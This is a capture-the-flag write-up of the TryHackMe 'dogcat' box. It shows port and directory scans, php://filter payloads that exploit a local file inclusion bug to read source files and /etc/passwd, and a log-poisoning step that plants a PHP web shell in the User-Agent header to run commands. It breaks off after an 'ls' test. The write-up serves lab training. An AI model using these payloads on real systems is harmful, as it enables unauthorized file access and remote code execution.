# 'dogcat' box writeup
## dogcat is a CTF box created by jammy and available on the [TryHackMe platform](https://tryhackme.com).
## Read about [LFI using wrappers](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter), [Log poisoning](https://liberty-shell.com/sec/2018/05/19/poisoning/)

# ![bg](images/background.png?raw=true "Title")

## Foothold
+ **We deploy the machine and start with a nmap scan for open ports**

``nmap -sV -sC -oN scan1 10.10.23.37``

+ **We observe 2 open ports, ssh and an http, the last one with an Apache service**

# ![h](images/nmapp.jpg?raw=true "dog")

+ **Taking a look inside the web page, we can see a gallery made of dog and cats; pressing one of the buttons, an image shows up and we can observe the [view] parameter inside our URL**

# ![h](images/webpage.png?raw=true "dog")

**I've tried out some LFI from this position but with no success. So i changed the query string, adding some text inside**

# ![h](images/triedo2.jpg?raw=true "dog")

**It looks that the LFI vuln is present, but in a different form. The php script seems to include the page that we insert into the [view] parameter, openning a stream. But, the ``/etc/passwd`` that we inserted now has another extension: a ``.php``one. Also, the strings needs to contains another substring inside: ``cat``. If we're not using this string, we have no output from our request**


+ **Now, let's try a gobuster scan to see what php files we can find so maybe we can read them**

``gobuster dir -u http://10.10.23.37/ -w /usr/share/wordlists/dirb/common.txt -x php``

# ![h](images/gobusto.jpg?raw=true "dog")

+ **Now we know that there's index.php and flag.php files inside our directory. Now, reading some of the LFI techniques, we can spot a PHP wrapper way: we are going to try to use a base64 encoding type to convert the content of the php index file and finally to read it. We must keep in mind the fact that the ``cat`` substring need to be inside our main string. Let's apply the filter over our [view] parameter**

``http://10.10.23.37/?view=php://filter/convert.base64-encode/cat/resource=index``

# ![h](images/index.jpg?raw=true "dog")

+ **Here we have the content of index.php page, encoded with base64. Let's decode it and look into our page source code, where we can see some interesting php code**

```php
<?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
```

+ **Let's understand this php code to see what's happening behind:** 
We have a **containsStr** function which returns the first occurence of a substring in a string; it's like the C **strstr** function.

Another thing it's that **$ext** variable which will be checked inside the URL parameter: if **$ext** exists, the URL file's extension will be used, else there will be set a *php* extension. We saw before that every string that we insert will end by having a *php* extension.

Then, the script checks if the view parameter is not NUL and checks if the query string contains the cat or dog substrings. If this happens, we get the inclusion and simultanously the extension is set with our **$ext**. 

So, we need to insert a **$ext** variable inside our view parameter, but without some value so we can read any file on the system

+ **We can read our first flag1 using the same wrapper, which outputs the flag php page now, encoded with the same base64**

``http://10.10.23.37/?view=php://filter/convert.base64-encode/cat/resource=flag``

+ **Let's move on and try to read the /etc/passwd file. I included the $ext value in the URL too**

``http://10.10.23.37/?view=php://filter/convert.base64-encode/cat/resource=../../../../etc/passwd&ext=``

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

# Log poison

+ **We can use LFI for path traversal and now we're moving on next step: log poison so we can access the system. Looking into the access.log file it seems like we are gonna use the User Agent poisoning**

``http://10.10.23.37/?view=cat/../../../../var/log/apache2/access.log&ext=``

# ![h](images/logpoison.jpg?raw=true "dog")

+ **In order to explain a little bit the log poison procedure, in the /var/log/apache2 folder, there's a file called access.log which keeps all the requests of the apache web-site. We are gonna modify the User-Agent parameter in our GET request with a system cmd so we can get a shell, the system will parse that log file and we will enter inside. The first method i will do this will be with the help of burpsuite. Take a request so we can modify it**

**Modify the User-Agent:** ``<?php echo system($_GET["cmd"]); ?>``
**Insert the 'cmd' variable into the URL and try a command (i've tried ls)**

# ![h](images/burpeds.jpg?raw=true "dog")

+ **We can see we have our output of ls command**



